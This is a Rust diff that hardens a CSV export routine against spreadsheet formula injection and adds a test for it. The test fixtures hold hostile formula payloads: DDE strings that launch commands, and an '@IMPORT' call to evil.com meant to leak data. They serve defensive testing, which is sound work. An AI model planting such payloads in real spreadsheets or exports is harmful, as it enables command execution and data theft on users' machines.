@@ -18,11 +18,16 @@ pub fn html_escape(input: &str) -> String {
 }
 
 pub fn csv_escape(input: &str) -> String {
+    let raw_starts_control =
+        input.starts_with('\t') || input.starts_with('\r') || input.starts_with('\n');
     let trimmed = input.trim_start();
-    let needs_formula_neutralization = trimmed.starts_with('=')
+    let needs_formula_neutralization = raw_starts_control
+        || trimmed.starts_with('=')
         || trimmed.starts_with('+')
         || trimmed.starts_with('-')
         || trimmed.starts_with('@')
+        || trimmed.starts_with('|')
+        || trimmed.starts_with('%')
         || trimmed.starts_with('\t')
         || trimmed.starts_with('\r');
 
@@ -67,16 +72,18 @@ pub fn export_csv(trees: &[ProjectTree]) -> Result<String> {
 
         let parent_id_str = node.parent_id.as_deref().unwrap_or("");
 
-        // CSV escape quotes and neutralize formula injection
+        // CSV escape quotes and neutralize formula injection on EVERY string field
+        let safe_prj_id = csv_escape(project_id);
+        let safe_prj_key = csv_escape(project_key);
         let safe_prj_title = csv_escape(project_title);
-        let safe_title = csv_escape(&node.title);
         let safe_node_id = csv_escape(&node.id);
+        let safe_title = csv_escape(&node.title);
         let safe_parent_id = csv_escape(parent_id_str);
 
         out.push_str(&format!(
             "\"{}\",\"{}\",\"{}\",\"{}\",\"{}\",\"{}\",{},{},{},{},{},{},{},{},{},{},{}\n",
-            project_id,
-            project_key,
+            safe_prj_id,
+            safe_prj_key,
             safe_prj_title,
             safe_node_id,
             safe_title,
@@ -641,5 +648,58 @@ mod tests {
         assert!(html.contains("Fix bug"));
         assert!(html.contains("Test disclaimer"));
         assert!(html.contains("$0.05"));
+    }
+
+    #[test]
+    fn test_csv_export_neutralizes_all_string_columns_against_formula_injection() {
+        let tree = ProjectTree {
+            id: "=cmd|' /C calc'!A0".into(),
+            key: "+12345".into(),
+            title: "  -SUM(A1:A10)".into(),
+            roots: vec![WorkTreeNode {
+                id: "@IMPORT(\"http://evil.com/leak\")".into(),
+                title: "\t=DDE(\"cmd\",\"/C calc\",\"!\")".into(),
+                parent_id: Some("\r-EXPLOIT()".into()),
+                direct: UsageTotals::default(),
+                inclusive: UsageTotals::default(),
+                children: vec![WorkTreeNode {
+                    id: "child_\"with_quotes\"".into(),
+                    title: "Child, with comma and\r\nnewline".into(),
+                    parent_id: Some("@IMPORT(\"http://evil.com/leak\")".into()),
+                    direct: UsageTotals::default(),
+                    inclusive: UsageTotals::default(),
+                    children: vec![],
+                }],
+            }],
+            totals: UsageTotals::default(),
+        };
+
+        let csv = export_csv(std::slice::from_ref(&tree)).unwrap();
+        let lines: Vec<&str> = csv.lines().collect();
+        assert!(lines.len() >= 3);
+
+        // Header
+        assert_eq!(
+            lines[0],
+            "project_id,project_key,project_title,work_item_id,work_item_title,parent_id,input_tokens,cache_read_tokens,cache_write_tokens,output_tokens,reasoning_tokens,total_tokens,requests,measured_requests,unavailable_requests,estimated_cost_dollars,completeness_pct"
+        );
+
+        // Line 1: Root node
+        // project_id: '=cmd|...
+        assert!(lines[1].starts_with("\"'=cmd|' /C calc'!A0\""));
+        // project_key: '+12345
+        assert!(lines[1].contains("\"'+12345\""));
+        // project_title: '  -SUM...
+        assert!(lines[1].contains("\"'  -SUM(A1:A10)\""));
+        // work_item_id: '@IMPORT...
+        assert!(lines[1].contains("\"'@IMPORT(\"\"http://evil.com/leak\"\")\""));
+        // work_item_title: '\t=DDE...
+        assert!(lines[1].contains("\"'\t=DDE(\"\"cmd\"\",\"\"/C calc\"\",\"\"!\"\")\""));
+        // parent_id: '\r-EXPLOIT...
+        assert!(lines[1].contains("\"'\r-EXPLOIT()\""));
+
+        // Verify quotes and newlines in child node
+        assert!(csv.contains("\"child_\"\"with_quotes\"\"\""));
+        assert!(csv.contains("\"Child, with comma and\r\nnewline\""));
     }
 }
